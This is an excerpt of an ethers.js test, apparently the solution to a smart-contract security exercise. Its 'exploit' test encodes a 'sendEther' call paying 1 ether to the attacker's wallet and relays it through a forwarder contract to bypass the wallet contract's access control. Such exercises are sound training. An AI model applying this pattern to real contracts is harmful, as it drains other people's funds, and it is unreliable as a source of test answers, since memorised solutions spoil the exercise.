...
describe(NAME, function () {
    ...
    describe("exploit", async function () {
        ...
        it("conduct your attack here", async function () {
            const iface = new ethers.utils.Interface(["function sendEther(address destination, uint256 amount)"]);
            const encoded = iface.encodeFunctionData("sendEther", [
                attackerWallet.address,
                ethers.utils.parseEther("1"),
            ]);
            await forwarderContract.functionCall(walletContract.address, encoded);
        });
